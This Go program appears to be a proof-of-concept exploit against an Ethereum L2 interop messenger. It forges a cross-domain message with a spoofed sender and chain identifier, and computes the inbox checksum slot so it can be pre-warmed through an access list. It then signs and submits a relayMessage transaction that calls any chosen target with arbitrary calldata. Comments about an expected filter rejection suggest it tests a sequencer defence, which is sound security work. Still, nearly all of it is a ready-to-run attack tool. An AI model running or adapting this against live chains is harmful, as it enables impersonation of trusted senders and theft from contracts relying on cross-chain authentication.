package main

import (
    "context"
    "encoding/hex"
    "flag"
    "fmt"
    "log"
    "math/big"
    "os"
    "strings"
    "time"

    "github.com/ethereum/go-ethereum/accounts/abi"
    "github.com/ethereum/go-ethereum/common"
    "github.com/ethereum/go-ethereum/common/hexutil"
    "github.com/ethereum/go-ethereum/core/types"
    "github.com/ethereum/go-ethereum/crypto"
    "github.com/ethereum/go-ethereum/ethclient"
    "github.com/ethereum/go-ethereum/params"
)

// Predeploy addresses for Interop
var (
    crossL2InboxAddr              = common.HexToAddress("0x4200000000000000000000000000000000000022")
    l2ToL2MessengerPredeployAddr  = common.HexToAddress("0x4200000000000000000000000000000000000023")
    sentMessageEventSelectorBytes = mustDecodeHex("382409ac69001e11931a28435afef442cbfd20d9891907e8fa373ba7d351f320")
)

func mustDecodeHex(h string) []byte {
    if strings.HasPrefix(h, "0x") {
        h = h[2:]
    }
    b, err := hex.DecodeString(h)
    if err != nil {
        panic(err)
    }
    return b
}

// packUint64BigEndian packs a uint64 into 8-byte big endian
func packUint64BigEndian(v uint64) []byte {
    b := make([]byte, 8)
    for i := 7; i >= 0; i-- {
        b[i] = byte(v & 0xff)
        v >>= 8
    }
    return b
}

// packUint32BigEndian packs a uint32 into 4-byte big endian
func packUint32BigEndian(v uint32) []byte {
    b := make([]byte, 4)
    for i := 3; i >= 0; i-- {
        b[i] = byte(v & 0xff)
        v >>= 8
    }
    return b
}

// leftPad32 pads a byte slice to 32-bytes with left zeros
func leftPad32(in []byte) []byte {
    if len(in) > 32 {
        return in[len(in)-32:]
    }
    out := make([]byte, 32)
    copy(out[32-len(in):], in)
    return out
}

// computeChecksum replicates CrossL2Inbox.calculateChecksum
// checksum = keccak256( keccak256( keccak256(origin || msgHash) || idPacked ) || chainId )
// then first byte forced to 0x03 (TYPE_3) via masking
func computeChecksum(origin common.Address, msgHash common.Hash, blockNumber uint64, timestamp uint64, logIndex uint32, chainID *big.Int) common.Hash {
    // logHash = keccak256(origin (20 bytes) || msgHash (32 bytes))
    var buf []byte
    buf = append(buf, origin.Bytes()...)
    buf = append(buf, msgHash.Bytes()...)
    logHash := crypto.Keccak256Hash(buf)

    // idPacked = 12 zero bytes || uint64(blockNumber) || uint64(timestamp) || uint32(logIndex)
    idPacked := make([]byte, 0, 32)
    idPacked = append(idPacked, make([]byte, 12)...)
    idPacked = append(idPacked, packUint64BigEndian(blockNumber)...)
    idPacked = append(idPacked, packUint64BigEndian(timestamp)...)
    idPacked = append(idPacked, packUint32BigEndian(logIndex)...)

    // idLogHash = keccak256(logHash || idPacked)
    tmp := append(logHash.Bytes(), idPacked...)
    idLogHash := crypto.Keccak256Hash(tmp)

    // bareChecksum = keccak256( idLogHash || uint256(chainID) )
    chainIDBytes := leftPad32(chainID.Bytes())
    bare := crypto.Keccak256Hash(append(idLogHash.Bytes(), chainIDBytes...))

    // apply masks: clear first byte then set to 0x03
    out := bare
    bz := out.Bytes()
    bz[0] = 0x03
    return common.BytesToHash(bz)
}

// buildSentMessagePayload produces the bytes payload described in L2ToL2CrossDomainMessenger._decodeSentMessagePayload
func buildSentMessagePayload(selector32 []byte, destination *big.Int, target common.Address, nonce *big.Int, sender common.Address, message []byte) ([]byte, error) {
    if len(selector32) != 32 {
        return nil, fmt.Errorf("selector must be 32 bytes")
    }
    // mid = abi.encode(uint256 destination, address target, uint256 nonce)
    tupleMid, err := abi.Arguments{
        {Type: mustType("uint256")},
        {Type: mustType("address")},
        {Type: mustType("uint256")},
    }.Pack(destination, target, nonce)
    if err != nil {
        return nil, fmt.Errorf("pack mid: %w", err)
    }
    // tail = abi.encode(address sender, bytes message)
    tail, err := abi.Arguments{
        {Type: mustType("address")},
        {Type: mustType("bytes")},
    }.Pack(sender, message)
    if err != nil {
        return nil, fmt.Errorf("pack tail: %w", err)
    }
    out := make([]byte, 0, 32+len(tupleMid)+len(tail))
    out = append(out, selector32...)
    out = append(out, tupleMid...)
    out = append(out, tail...)
    return out, nil
}

func mustType(ts string) abi.Type {
    t, err := abi.NewType(ts, "", nil)
    if err != nil {
        panic(err)
    }
    return t
}

// relayMessage ABI for L2ToL2CrossDomainMessenger
const messengerABIJSON = `[{"name":"relayMessage","type":"function","stateMutability":"payable","inputs":[{"name":"_id","type":"tuple","components":[{"name":"origin","type":"address"},{"name":"blockNumber","type":"uint256"},{"name":"logIndex","type":"uint256"},{"name":"timestamp","type":"uint256"},{"name":"chainId","type":"uint256"}]},{"name":"_sentMessage","type":"bytes"}],"outputs":[{"name":"","type":"bytes"}]}]`

func main() {
    // CLI flags
    rpcURL := flag.String("rpc", "http://127.0.0.1:8545", "L2 RPC URL")
    privHex := flag.String("priv", "", "hex private key of funded sender (0x...) ")
    targetHex := flag.String("target", "", "target address to call (0x...)")
    dataHex := flag.String("data", "0x", "calldata for target (0x...) ")
    valueEth := flag.String("value", "0", "value in ETH to forward with call")
    sourceChainID := flag.Uint64("sourceChainId", 1111, "forge: source chain id for Identifier")
    blockOverride := flag.Uint64("idBlock", 0, "override Identifier.blockNumber (default: latest)")
    timeOverride := flag.Uint64("idTime", 0, "override Identifier.timestamp (default: latest) ")
    logIndex := flag.Uint("idLogIndex", 0, "Identifier.logIndex (default: 0)")
    senderHex := flag.String("xSender", "0x1111111111111111111111111111111111111111", "forged x-domain sender address")
    gasLimit := flag.Uint64("gas", 1_200_000, "gas limit")
    maxFeeGwei := flag.Uint64("maxFee", 10, "maxFeePerGas in gwei")
    maxTipGwei := flag.Uint64("maxTip", 1, "maxPriorityFeePerGas in gwei")
    dryRun := flag.Bool("dry", false, "build and print tx but do not send")
    flag.Parse()

    if *privHex == "" || *targetHex == "" {
        log.Fatalf("missing --priv or --target")
    }

    // Parse keys and addresses
    pk, err := crypto.HexToECDSA(strings.TrimPrefix(*privHex, "0x"))
    if err != nil {
        log.Fatalf("priv key: %v", err)
    }
    from := crypto.PubkeyToAddress(pk.PublicKey)
    target := common.HexToAddress(*targetHex)
    forgedSender := common.HexToAddress(*senderHex)
    callData := common.FromHex(*dataHex)

    // Connect to RPC
    ctx := context.Background()
    cli, err := ethclient.DialContext(ctx, *rpcURL)
    if err != nil {
        log.Fatalf("rpc dial: %v", err)
    }
    defer cli.Close()

    // chain params
    chainID, err := cli.ChainID(ctx)
    if err != nil {
        log.Fatalf("chainId: %v", err)
    }
    // latest header
    header, err := cli.HeaderByNumber(ctx, nil)
    if err != nil {
        log.Fatalf("header: %v", err)
    }
    idBlock := header.Number.Uint64()
    if *blockOverride != 0 {
        idBlock = *blockOverride
    }
    idTime := header.Time
    if *timeOverride != 0 {
        idTime = *timeOverride
    }
    idLog := uint32(*logIndex)

    // Build SentMessage payload
    dest := new(big.Int).Set(chainID)
    nonce := big.NewInt(time.Now().UnixNano())
    sentPayload, err := buildSentMessagePayload(sentMessageEventSelectorBytes, dest, target, nonce, forgedSender, callData)
    if err != nil {
        log.Fatalf("build sent payload: %v", err)
    }

    // Compute msgHash and checksum slot
    msgHash := crypto.Keccak256Hash(sentPayload)
    checksum := computeChecksum(l2ToL2MessengerPredeployAddr, msgHash, idBlock, idTime, idLog, new(big.Int).SetUint64(*sourceChainID))

    // ABI-encode relayMessage arguments
    messengerABI, err := abi.JSON(strings.NewReader(messengerABIJSON))
    if err != nil {
        log.Fatalf("parse abi: %v", err)
    }
    // Identifier tuple
    idTuple := struct {
        Origin      common.Address
        BlockNumber *big.Int
        LogIndex    *big.Int
        Timestamp   *big.Int
        ChainId     *big.Int
    }{
        Origin:      l2ToL2MessengerPredeployAddr,
        BlockNumber: new(big.Int).SetUint64(idBlock),
        LogIndex:    new(big.Int).SetUint64(uint64(idLog)),
        Timestamp:   new(big.Int).SetUint64(idTime),
        ChainId:     new(big.Int).SetUint64(*sourceChainID),
    }
    data, err := messengerABI.Pack("relayMessage", idTuple, sentPayload)
    if err != nil {
        log.Fatalf("pack relayMessage: %v", err)
    }

    // Build tx with EIP-2930 access list warming CROSS_L2_INBOX checksum slot
    // AccessList warms (address, storageKey)
    accessList := types.AccessList{
        {
            Address:     crossL2InboxAddr,
            StorageKeys: []common.Hash{checksum},
        },
    }

    // Fees
    maxFee := new(big.Int).Mul(big.NewInt(int64(*maxFeeGwei)), big.NewInt(params.GWei))
    maxTip := new(big.Int).Mul(big.NewInt(int64(*maxTipGwei)), big.NewInt(params.GWei))

    // Value
    valWei, ok := new(big.Int).SetString(*valueEth, 10)
    if !ok {
        // interpret as decimal ETH if contains dot? Keep simple: accept int or decimal in ETH
        // Allow 0x hex too
        if strings.HasPrefix(*valueEth, "0x") {
            vb := common.FromHex(*valueEth)
            valWei = new(big.Int).SetBytes(vb)
        } else {
            // try float ETH -> wei
            f, perr := parseEthToWei(*valueEth)
            if perr != nil {
                log.Fatalf("value parse: %v", perr)
            }
            valWei = f
        }
    }

    nonceOnChain, err := cli.PendingNonceAt(ctx, from)
    if err != nil {
        log.Fatalf("nonce: %v", err)
    }

    tx := types.NewTx(&types.DynamicFeeTx{
        ChainID:   chainID,
        Nonce:     nonceOnChain,
        GasTipCap: maxTip,
        GasFeeCap: maxFee,
        Gas:       *gasLimit,
        To:        &l2ToL2MessengerPredeployAddr,
        Value:     valWei,
        Data:      data,
        AccessList: accessList,
    })

    // Sign and (optionally) send
    signer := types.LatestSignerForChainID(chainID)
    signed, err := types.SignTx(tx, signer, pk)
    if err != nil {
        log.Fatalf("sign: %v", err)
    }

    raw, err := signed.MarshalBinary()
    if err != nil {
        log.Fatalf("marshal: %v", err)
    }

    fmt.Printf("From: %s\n", from)
    fmt.Printf("To (messenger): %s\n", l2ToL2MessengerPredeployAddr)
    fmt.Printf("Target: %s\n", target)
    fmt.Printf("Forged xDomain sender: %s\n", forgedSender)
    fmt.Printf("Checksum slot: %s\n", checksum.Hex())
    fmt.Printf("AccessList: [%s => %s]\n", crossL2InboxAddr, checksum)
    fmt.Printf("Tx: %s\n", signed.Hash().Hex())
    fmt.Printf("Raw: %s\n", hexutil.Encode(raw))

    if *dryRun {
        fmt.Println("--dry: not sending")
        os.Exit(0)
    }

    err = cli.SendTransaction(ctx, signed)
    if err != nil {
        // If filtering ON, expect an error here: transaction rejected
        fmt.Printf("SendTransaction error (likely filtered): %v\n", err)
        os.Exit(1)
    }
    fmt.Println("Submitted. Waiting for receipt...")
    rcpt, err := waitReceipt(ctx, cli, signed.Hash(), 30*time.Second)
    if err != nil {
        log.Fatalf("receipt: %v", err)
    }
    fmt.Printf("Status: %d, GasUsed: %d\n", rcpt.Status, rcpt.GasUsed)
}

func waitReceipt(ctx context.Context, cli *ethclient.Client, h common.Hash, timeout time.Duration) (*types.Receipt, error) {
    dl, cancel := context.WithTimeout(ctx, timeout)
    defer cancel()
    ticker := time.NewTicker(500 * time.Millisecond)
    defer ticker.Stop()
    for {
        select {
        case <-dl.Done():
            return nil, fmt.Errorf("timeout waiting for receipt")
        case <-ticker.C:
            rcpt, err := cli.TransactionReceipt(ctx, h)
            if err == nil && rcpt != nil {
                return rcpt, nil
            }
        }
    }
}

// parseEthToWei parses decimal ETH string to wei big.Int
func parseEthToWei(s string) (*big.Int, error) {
    // very simple decimal parser: up to 18 decimals
    s = strings.TrimSpace(s)
    if strings.HasPrefix(s, "0x") {
        b := common.FromHex(s)
        return new(big.Int).SetBytes(b), nil
    }
    parts := strings.Split(s, ".")
    if len(parts) > 2 {
        return nil, fmt.Errorf("invalid decimal: %s", s)
    }
    intPart := parts[0]
    frac := ""
    if len(parts) == 2 {
        frac = parts[1]
        if len(frac) > 18 {
            frac = frac[:18]
        }
    }
    for len(frac) < 18 {
        frac += "0"
    }
    whole := new(big.Int)
    if intPart != "" {
        var ok bool
        whole, ok = new(big.Int).SetString(intPart, 10)
        if !ok {
            return nil, fmt.Errorf("invalid int part: %s", intPart)
        }
    }
    fracInt := new(big.Int)
    if frac != "" {
        var ok bool
        fracInt, ok = new(big.Int).SetString(frac, 10)
        if !ok {
            return nil, fmt.Errorf("invalid frac part: %s", frac)
        }
    }
    wei := new(big.Int).Mul(whole, big.NewInt(params.Ether))
    wei.Add(wei, fracInt)
    return wei, nil
}

